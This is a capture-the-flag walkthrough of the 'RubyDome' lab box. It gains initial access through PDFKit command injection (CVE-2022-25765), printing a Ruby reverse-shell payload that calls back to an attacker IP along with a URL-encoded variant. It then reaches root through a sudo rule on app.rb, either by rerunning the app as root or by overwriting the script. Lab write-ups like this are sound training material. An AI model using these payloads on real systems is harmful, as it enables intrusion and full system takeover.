# RubyDome

## Initial access

Ran an automated enumeration scan against the target host.

```
sudo autorecon 192.168.249.124
```

The scan revealed two open ports:

- **22** — SSH (OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0))
- **3000** — HTTP (WEBrick httpd 1.7.0 (Ruby 3.0.2 (2021-07-07)))

Navigated to `http://192.168.112.22:3000/` in a browser. The application is a RubyDome HTML-to-PDF converter that accepts a URL as user input. Submitting a URL and requesting conversion redirected to `http://192.168.112.22:3000/pdf` with a preview of the generated PDF.

Attempted command injection by appending `; whoami` to the URL input at `http://192.168.112.22:3000/`. The request redirected to `/pdf` and displayed an error page, confirming that user input is passed to a shell command:

```
# **PDFKit::ImproperWkhtmltopdfExitStatus** at **/pdf**

## Command failed (exitstatus=1): /usr/local/bin/wkhtmltopdf --quiet --page-size Letter --margin-top 0.75in --margin-right 0.75in --margin-bottom 0.75in --margin-left 0.75in --encoding UTF-8 "http://192.168.112.22:3000/;%20whoami" page.pdf
```

Searched Exploit-DB for known vulnerabilities in the PDFKit gem:

```
searchsploit pdfkit
----------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------------
 pdfkit v0.8.7.2 - Command Injection                                                | ruby/local/51293.py
----------------------------------------------------------------------------------- ---------------------------------
```

Downloaded the exploit script (51293.py) and set up a listener with penelope to catch a reverse shell. The exploit targets CVE-2022-25765, a command injection vulnerability in PDFKit where the URL parameter is passed directly to `wkhtmltopdf` without sanitization.

```
python3 51293.py -s 192.168.45.189 4444 -w http://192.168.112.22:3000/pdf -p url

        _ __,~~~/_        __  ___  _______________  ___  ___
    ,~~`( )_( )-\|       / / / / |/ /  _/ ___/ __ \/ _ \/ _ \
        |/|  `--.       / /_/ /    // // /__/ /_/ / , _/ // /
_V__v___!_!__!_____V____\____/_/|_/___/\___/\____/_/|_/____/....

UNICORD: Exploit for CVE-2022–25765 (pdfkit) - Command Injection
OPTIONS: Reverse Shell Sent to Target Website Mode
PAYLOAD: http://%20`ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("192.168.45.189","4444"))'`
LOCALIP: 192.168.45.189:4444
WARNING: Be sure to start a local listener on the above IP and port. "nc -lnvp 4444".
WEBSITE: http://192.168.112.22:3000/pdf
POSTARG: url
EXPLOIT: Payload sent to website!
SUCCESS: Exploit performed action.

# penelope
andrew@rubydome:~/app$ whoami
andrew
```

An alternative approach is to URL-encode the payload and send a POST request with the `url` parameter through Burp Suite, which also succeeds in triggering the injection.

```
url=http%3a//%2520`ruby+-rsocket+-e'spawn("sh",[%3ain,%3aout,%3aerr]%3d>TCPSocket.new("192.168.45.189","4444"))'`
```

Located and retrieved the `local.txt` flag:

```
andrew@rubydome:~/app$ find / -name local.txt 2>/dev/null
/home/andrew/local.txt

andrew@rubydome:~/app$ cat /home/andrew/local.txt
797e2c53888aa6ff486281b264280544
```

## Privilege escalation

Checked the sudo privileges for user `andrew`:

```
andrew@rubydome:~/app$ sudo -l
...
User andrew may run the following commands on rubydome:
    (ALL) NOPASSWD: /usr/bin/ruby /home/andrew/app/app.rb
```

User `andrew` is allowed to run `/usr/bin/ruby /home/andrew/app/app.rb` as any user (including root) without a password. Examined the script contents:

```
andrew@rubydome:~/app$ cat app.rb
require 'pdfkit'
require 'sinatra'
set :bind, '0.0.0.0'
set :port, 3000
get '/' do
  <<-HTML
  <html>
    <head>
      <title>RubyDome HTML to PDF</title>
      <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
    </head>
    <body>
      <div class="container">
        <div class="row">
          <div class="col-md-6 col-md-offset-3">
            <h1>RubyDome HTML to PDF</h1>
            <form action="/pdf" method="post">
              <div class="form-group">
                <label for="url">Enter the URL of the HTML page:</label>
                <input type="url" name="url" id="url" class="form-control" required>
              </div>
              <button type="submit" class="btn btn-primary">Convert to PDF</button>
            </form>
          </div>
        </div>
      </div>
    </body>
  </html>
  HTML
end

post '/pdf' do
  url = params['url']
  kit = PDFKit.new(url)
  kit.to_file('page.pdf')
  send_file('page.pdf')
end
```

The script is a Sinatra web application that serves the HTML-to-PDF converter on port 3000. Since `andrew` owns the file and can execute it as root via sudo, the plan is to restart the web server as root and re-exploit the same PDFKit command injection to obtain a root shell.

Killed the existing web server process and started it under sudo to run as root:

```
andrew@rubydome:~/app$ ps aux | grep ruby
root         908  0.0  0.0   2888   984 ?        Ss   06:53   0:00 /bin/sh -c cd /home/andrew/app && su -c "ruby app.rb" andrew
root         911  0.0  0.2  10188  4528 ?        S    06:53   0:00 su -c ruby app.rb andrew
andrew       958  0.0  0.0   2888   952 ?        Ss   06:53   0:00 sh -c ruby app.rb
andrew       959  0.0  2.0 227436 41680 ?        Sl   06:53   0:00 ruby app.rb
andrew      1515  0.0  0.1   6608  2244 pts/0    S+   06:59   0:00 grep --color=auto ruby

andrew@rubydome:~/app$ kill 959
andrew@rubydome:~/app$ sudo /usr/bin/ruby /home/andrew/app/app.rb &

andrew@rubydome:~/app$ ps aux | grep ruby
root        1519  0.0  0.2  11492  5776 pts/0    S    06:59   0:00 sudo /usr/bin/ruby /home/andrew/app/app.rb
root        1520  0.0  0.0  11492   884 pts/1    Ss+  06:59   0:00 sudo /usr/bin/ruby /home/andrew/app/app.rb
root        1521  2.1  1.7  92068 34540 pts/1    S    06:59   0:00 /usr/bin/ruby /home/andrew/app/app.rb
andrew      1527  0.0  0.1   6476  2428 pts/0    S+   07:00   0:00 grep --color=auto ruby
```

The web server is now running as root. Re-ran the PDFKit command injection exploit on a different port and caught a root reverse shell:

```
python3 51293.py -s 192.168.45.189 4443 -w http://192.168.112.22:3000/pdf -p url

# penelope
root@rubydome:/home/andrew/app# whoami
root
```

Retrieved the `proof.txt` flag:

```
root@rubydome:/home/andrew/app# cd /root
root@rubydome:~# cat proof.txt
a1be3db9d23af6014fd90a7406518136
```

### Alternative Privilege Escalation — app.rb overwrite

Running `sudo -l` revealed that user `andrew` can execute `/usr/bin/ruby /home/andrew/app/app.rb` as root without a password. Since `andrew` owns the file at `/home/andrew/app/app.rb`, it is writable by the user. Instead of restarting the web server, the script can be overwritten with a simple Ruby payload that spawns a shell, then executed via sudo to gain root.

```
echo 'exec "/bin/bash"' > /home/andrew/app/app.rb
sudo /usr/bin/ruby /home/andrew/app/app.rb
```

The overwritten script executes `/bin/bash` when run, and since it is invoked through sudo with root privileges, a root shell is obtained directly. Credit: [The Husky Hacker — RubyDome Writeup](https://hackindex.io/writeups/rubydome)
